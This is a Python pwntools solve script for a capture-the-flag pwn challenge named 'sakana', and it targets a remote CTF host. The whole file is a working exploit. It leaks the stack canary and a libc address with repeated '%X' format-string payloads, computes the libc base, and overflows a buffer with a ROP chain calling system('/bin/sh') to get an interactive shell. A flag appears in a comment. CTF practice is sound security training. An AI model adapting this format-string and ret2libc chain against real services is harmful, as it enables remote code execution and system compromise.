#!/usr/bin/env python3

from pwn import *
import sys
from typing import Union

binary = ELF("./sakana_patched")
libc = ELF("./libc.so.6")

context.binary = binary
context.terminal = ["tmux", "splitw", "-h", "-e", "GDB=pwndbg"]


def one_gadget(filename: str) -> list:
    return [int(i) for i in
            __import__('subprocess').check_output(['one_gadget', '--raw', filename]).decode().split(' ')]


GDB_SCRIPT = '''
b *parse_cmd+187
'''.strip()


def conn() -> Union[process, remote]:
    io = None
    for arg in sys.argv[1:]:
        # ./solve <any option> d
        if arg == 'd':
            context.log_level = 'debug'
        # ./solve l
        if arg == 'l':
            io = process([binary.path])
        # ./solve g
        elif arg == 'g':
            io = gdb.debug([binary.path], gdbscript=GDB_SCRIPT)
    # $ ./solve
    if io is None:
        io = remote("ctf.adl.tw", 10003)
    return io


def main():
    io = conn()

    io.sendlineafter(b"~> ", b"printf")

    payload = b"%X" * 39

    io.sendline(payload)

    leaks = io.recvuntil(b"~> ", drop=True).split(b"0x")

    canary = leaks[-1]
    info(f"canary found: {canary}")

    io.sendline(b"printf")
    payload = b"%X" * 45
    io.sendline(payload)
    leaks = io.recvuntil(b"~> ", drop=True).split(b"0x")
    libc_leaked = int(leaks[-1], 16)
    info(f"libc leaked: {libc_leaked:#x}")
    libc.address = libc_leaked - 243 - libc.sym["__libc_start_main"]
    success(f"libc base: {libc.address:#x}")

    rop = ROP(libc)
    rop_chain = p64(rop.ret.address)
    rop_chain += p64(rop.rdi.address)
    rop_chain += p64(next(libc.search(b"/bin/sh")))
    rop_chain += p64(libc.symbols["system"])

    io.sendline(b"printf")
    payload = flat(
    {
        0x110 - 8: bytes.fromhex(canary.decode())[::-1],
        0x110 + 8: rop_chain
    }
    , length=0x1ff)
    io.sendline(payload)

    io.interactive() # ADL{5aK4Na~~~cH1n4N4g0~~~https://youtu.be/Rwzy6Qt8gq8}


if __name__ == "__main__":
    main()
